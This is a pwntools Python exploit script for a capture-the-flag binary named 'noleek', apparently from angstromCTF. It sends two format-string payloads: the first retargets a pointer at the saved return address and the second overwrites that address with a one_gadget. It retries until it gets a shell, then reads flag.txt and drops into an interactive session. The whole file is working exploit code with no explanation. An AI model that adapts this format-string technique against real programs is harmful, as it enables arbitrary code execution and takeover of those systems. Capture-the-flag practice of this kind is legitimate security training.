#!/usr/bin/python3

from pwn import *

exe = ELF('noleek_patched', checksec=False)
sl = lambda data: p.sendline(data)

while True:
	if args.REMOTE:
		# p = remote('127.0.0.1', 5000)
		p = remote('challs.actf.co', 31400)
	else:
		p = process(exe.path)

	try:
		#######################################################
		### Stage 1: Change value of a pointer to saved rip ###
		#######################################################
		payload = f'%*c%{0x38}c%29$hn'.encode()
		sl(payload)

		###############################################
		### Stage 2: Change saved rip to one_gadget ###
		###############################################
		payload = f'%*16$c%{0xa5e51}c%42$n'.encode()
		sl(payload)
		p.recvuntil(b'noleek.\n')
		
		p.sendline(b'cat flag.txt')
		p.recvuntil(b'actf')
	except:
		p.close()
		continue

	break
p.interactive()
